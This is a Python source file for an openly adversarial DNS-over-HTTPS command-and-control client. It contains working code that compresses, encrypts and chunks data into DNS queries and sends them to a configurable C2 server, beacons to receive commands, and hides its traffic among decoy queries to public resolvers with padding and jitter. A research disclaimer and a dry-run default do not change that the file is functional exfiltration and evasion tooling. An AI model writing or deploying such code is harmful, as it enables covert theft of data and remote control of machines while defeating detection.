"""
Adversarial DoH C2 Client
==========================
Implements a DNS-over-HTTPS command-and-control channel with
pluggable evasion strategies from the TrafficShaper.

Encoding options:
  - Subdomain labels  (most common)
  - DNS TXT records   (high capacity, suspicious)
  - CNAME chains      (subtle, harder to detect)

Transport:
  - Uses the DoH wire format (RFC 8484)
  - Sends to a configurable DoH resolver (or your own C2 server)

FOR RESEARCH / EDUCATIONAL USE ONLY.
Run only against infrastructure you own or have permission to test.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import os
import random
import socket
import struct
import time
import zlib
from dataclasses import dataclass
from typing import Optional, List, Tuple

# Optional async HTTP — install: pip install httpx
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False
    print("[!] httpx not installed. DoH sending disabled (schedule generation still works).")

from traffic_shaper import TrafficShaper, EvasionStrategy, QuerySchedule


# ── C2 Protocol ───────────────────────────────────────────────────────────────

@dataclass
class C2Packet:
    """
    Wire format for C2 data embedded in DNS queries.
    Kept minimal to reduce per-query overhead.
    """
    seq:      int    # Sequence number for reassembly
    total:    int    # Total number of chunks
    session:  bytes  # 4-byte session ID
    payload:  bytes  # Encrypted, compressed data chunk


class C2Protocol:
    """
    Handles serialization, encryption, and compression of C2 data.
    Designed to fit within DNS label length constraints.
    """

    MAX_LABEL_BYTES = 30   # Conservative limit after base32 expansion
    MAGIC = b"\xc2\xd0"   # 2-byte sync marker

    def __init__(self, psk: bytes = b"research-key-change-me"):
        self.psk = psk
        self.session_id = os.urandom(4)

    def prepare_payload(self, data: bytes) -> List[C2Packet]:
        """
        Takes raw C2 data, compresses + encrypts it, splits into chunks.
        Returns ordered list of C2Packet objects.
        """
        compressed = zlib.compress(data, level=9)
        encrypted  = self._xor_encrypt(compressed)
        chunks     = self._split(encrypted, self.MAX_LABEL_BYTES)

        return [
            C2Packet(
                seq=i,
                total=len(chunks),
                session=self.session_id,
                payload=chunk,
            )
            for i, chunk in enumerate(chunks)
        ]

    def encode_packet(self, pkt: C2Packet) -> bytes:
        """Serialize C2Packet to bytes for embedding in a DNS label."""
        header = struct.pack(">HHI",
            pkt.seq,
            pkt.total,
            int.from_bytes(pkt.session, "big")
        )
        return self.MAGIC + header + pkt.payload

    def decode_packet(self, data: bytes) -> Optional[C2Packet]:
        """Deserialize bytes extracted from a DNS response."""
        if not data.startswith(self.MAGIC):
            return None
        data = data[2:]
        seq, total, session_int = struct.unpack(">HHI", data[:8])
        return C2Packet(
            seq=seq,
            total=total,
            session=session_int.to_bytes(4, "big"),
            payload=data[8:],
        )

    def reassemble(self, packets: List[C2Packet]) -> Optional[bytes]:
        """Reassemble ordered chunks into original data."""
        packets.sort(key=lambda p: p.seq)
        if len(packets) != packets[-1].total:
            return None  # Missing chunks
        encrypted  = b"".join(p.payload for p in packets)
        compressed = self._xor_encrypt(encrypted)  # XOR is its own inverse
        return zlib.decompress(compressed)

    def _xor_encrypt(self, data: bytes) -> bytes:
        """Simple XOR stream cipher keyed by HMAC-SHA256 of session+PSK."""
        key = hmac.new(self.psk, self.session_id, hashlib.sha256).digest()
        key_stream = (key * (len(data) // 32 + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_stream))

    def _split(self, data: bytes, size: int) -> List[bytes]:
        return [data[i:i+size] for i in range(0, len(data), size)]


# ── DNS Wire Format Builder ───────────────────────────────────────────────────

class DNSWireFormat:
    """Build RFC 1035 DNS query messages."""

    @staticmethod
    def build_query(domain: str, qtype: int = 1, txid: int = None) -> bytes:
        """
        Build a raw DNS query for embedding in DoH POST body.
        qtype: 1=A, 28=AAAA, 16=TXT, 5=CNAME
        """
        if txid is None:
            txid = random.randint(0, 65535)

        # Header: ID, FLAGS, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
        header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)

        # Question section
        labels = b""
        for label in domain.rstrip(".").split("."):
            encoded = label.encode()
            labels += struct.pack("B", len(encoded)) + encoded
        labels += b"\x00"  # Root label
        question = labels + struct.pack(">HH", qtype, 1)  # qtype, qclass=IN

        return header + question

    @staticmethod
    def add_edns0_padding(query: bytes, target_size: int) -> bytes:
        """
        Add EDNS0 OPT record with padding (RFC 7830) to reach target_size.
        This is legit browser behavior AND helps us match size distributions.
        """
        current = len(query)
        pad_needed = max(0, target_size - current - 11)  # 11 = OPT record overhead

        # OPT record: NAME=0, TYPE=OPT(41), CLASS=udp_size, TTL=0, RDLEN=pad_len+4
        opt_rdata = struct.pack(">HH", 12, pad_needed) + b"\x00" * pad_needed
        opt = (b"\x00"                          # Name = root
               + struct.pack(">H", 41)          # TYPE = OPT
               + struct.pack(">H", 4096)        # CLASS = UDP payload size
               + struct.pack(">I", 0)           # TTL = extended RCODE + flags
               + struct.pack(">H", len(opt_rdata))
               + opt_rdata)

        # Increment ARCOUNT in header
        hdr = bytearray(query[:12])
        arcount = struct.unpack(">H", bytes(hdr[10:12]))[0]
        hdr[10:12] = struct.pack(">H", arcount + 1)
        return bytes(hdr) + query[12:] + opt


# ── DoH Client ────────────────────────────────────────────────────────────────

class DoHC2Client:
    """
    Adversarial DoH C2 client.
    Encodes C2 data into DNS queries sent via HTTPS to a DoH resolver/C2 server.
    """

    # Public DoH resolvers for testing cover traffic (benign queries)
    COVER_RESOLVERS = {
        "cloudflare": "https://1.1.1.1/dns-query",
        "google":     "https://8.8.8.8/dns-query",
        "quad9":      "https://9.9.9.9/dns-query",
    }

    def __init__(
        self,
        c2_server_url:   str,
        psk:             bytes = b"research-key-change-me",
        fingerprint_path: Optional[str] = None,
        strategy:        EvasionStrategy = EvasionStrategy.FULL_MIMICRY,
        dry_run:         bool = True,     # True = print schedule, don't send
    ):
        self.c2_url     = c2_server_url
        self.protocol   = C2Protocol(psk)
        self.shaper     = TrafficShaper(fingerprint_path)
        self.strategy   = strategy
        self.dry_run    = dry_run
        self.dns_wire   = DNSWireFormat()
        self._stats     = {"sent": 0, "cover": 0, "errors": 0, "bytes": 0}

        if dry_run:
            print("[*] DRY RUN MODE — no packets will be sent")

    # ── Public API ────────────────────────────────────────────────────────────

    async def exfiltrate(self, data: bytes) -> bool:
        """
        Main exfiltration method.
        Splits data into packets, shapes the flow, sends queries.
        """
        print(f"\n[*] Exfiltrating {len(data)} bytes using strategy: {self.strategy.value}")

        # Prepare C2 packets
        c2_packets = self.protocol.prepare_payload(data)
        raw_payload = b"".join(self.protocol.encode_packet(p) for p in c2_packets)

        # Build evasion schedule
        schedule = self.shaper.build_schedule(
            c2_payload=raw_payload,
            strategy=self.strategy,
        )

        profile = self.shaper.summarize_schedule(schedule)
        print(f"[*] Schedule: {profile.total_queries} queries over ~{profile.duration_ms/1000:.1f}s")

        # Execute schedule
        await self._execute_schedule(schedule)

        print(f"\n[+] Exfiltration complete")
        print(f"    Sent:   {self._stats['sent']} real queries")
        print(f"    Cover:  {self._stats['cover']} decoy queries")
        print(f"    Errors: {self._stats['errors']}")
        return self._stats["errors"] == 0

    async def beacon(self, interval_seconds: float = None) -> bytes:
        """
        Single beacon — check in with C2 and receive commands.
        Returns raw command bytes.
        """
        beacon_data = json.dumps({
            "session": self.protocol.session_id.hex(),
            "ts":      int(time.time()),
            "type":    "beacon",
        }).encode()

        # Use a small, single-packet beacon with timing evasion
        schedule = self.shaper.build_schedule(
            c2_payload=beacon_data,
            strategy=EvasionStrategy.TIMING_ONLY,
            chunk_size=len(beacon_data),
        )

        if interval_seconds:
            # Sleep before beaconing (jittered)
            jitter = random.uniform(0.85, 1.15)
            await asyncio.sleep(interval_seconds * jitter)

        return await self._execute_schedule(schedule)

    # ── Execution ─────────────────────────────────────────────────────────────

    async def _execute_schedule(self, schedule: List[QuerySchedule]) -> bytes:
        """Execute a query schedule, respecting timing delays."""
        responses = []

        for q in schedule:
            # Respect inter-query delay
            await asyncio.sleep(q.delay_ms / 1000.0)

            if q.is_cover:
                resp = await self._send_cover_query(q)
                self._stats["cover"] += 1
            else:
                resp = await self._send_c2_query(q)
                self._stats["sent"] += 1

            if resp:
                responses.append(resp)

        return b"".join(responses)

    async def _send_c2_query(self, q: QuerySchedule) -> Optional[bytes]:
        """Send a real C2 query to our server."""
        dns_msg = self.dns_wire.build_query(q.domain, q.dns_type)

        if q.padding_bytes > 0:
            target = len(dns_msg) + q.padding_bytes
            dns_msg = self.dns_wire.add_edns0_padding(dns_msg, target)

        self._stats["bytes"] += len(dns_msg)

        if self.dry_run:
            print(f"  [DRY] C2 query → {q.domain[:40]}... "
                  f"({len(dns_msg)}B, delay={q.delay_ms:.0f}ms, type={q.dns_type})")
            return b""

        return await self._post_doh(self.c2_url, dns_msg)

    async def _send_cover_query(self, q: QuerySchedule) -> Optional[bytes]:
        """Send a decoy query to a real public resolver."""
        dns_msg = self.dns_wire.build_query(q.domain, q.dns_type)

        if q.padding_bytes > 0:
            target = len(dns_msg) + q.padding_bytes
            dns_msg = self.dns_wire.add_edns0_padding(dns_msg, target)

        if self.dry_run:
            resolver = random.choice(list(self.COVER_RESOLVERS.values()))
            print(f"  [DRY] Cover query → {q.domain} → {resolver} ({len(dns_msg)}B)")
            return b""

        resolver_url = random.choice(list(self.COVER_RESOLVERS.values()))
        return await self._post_doh(resolver_url, dns_msg)

    async def _post_doh(self, url: str, dns_msg: bytes) -> Optional[bytes]:
        """POST a DNS wire-format message to a DoH endpoint (RFC 8484)."""
        if not HAS_HTTPX:
            return None
        try:
            async with httpx.AsyncClient(verify=True, timeout=10.0) as client:
                resp = await client.post(
                    url,
                    content=dns_msg,
                    headers={
                        "Content-Type": "application/dns-message",
                        "Accept":       "application/dns-message",
                        "User-Agent":   "Mozilla/5.0 (compatible; DoH-Client)",
                    }
                )
                if resp.status_code == 200:
                    return resp.content
        except Exception as e:
            self._stats["errors"] += 1
            print(f"  [ERR] {e}")
        return None


# ── CLI demo ──────────────────────────────────────────────────────────────────

async def demo():
    """
    Demonstrate the C2 client in dry-run mode.
    No actual network traffic is sent.
    """
    print("=" * 60)
    print("  DoH Adversarial C2 — Dry-Run Demo")
    print("  (No packets sent — schedule generation only)")
    print("=" * 60)

    client = DoHC2Client(
        c2_server_url="https://your-c2-server.example.com/dns-query",
        dry_run=True,
        strategy=EvasionStrategy.FULL_MIMICRY,
    )

    # Simulate exfiltrating a small "stolen" file
    fake_secret = json.dumps({
        "hostname": "target-machine",
        "user":     "researcher",
        "data":     "A" * 200,  # 200 bytes of payload
    }).encode()

    await client.exfiltrate(fake_secret)

    # Show what different strategies look like
    print("\n" + "=" * 60)
    print("  Comparing strategies:")
    print("=" * 60)

    shaper = TrafficShaper()
    for strat in [EvasionStrategy.NAIVE, EvasionStrategy.TIMING_ONLY,
                  EvasionStrategy.FULL_MIMICRY]:
        sched = shaper.build_schedule(fake_secret, strategy=strat, chunk_size=30)
        prof  = shaper.summarize_schedule(sched)
        iats  = [q.delay_ms for q in sched]
        print(f"\n  [{strat.value}]")
        print(f"    Queries:  {prof.total_queries}")
        print(f"    IAT mean: {prof.mean_iat_ms:.0f}ms  std: {prof.std_iat_ms:.0f}ms")
        print(f"    Size mean:{prof.mean_query_size:.0f}B")


if __name__ == "__main__":
    asyncio.run(demo())
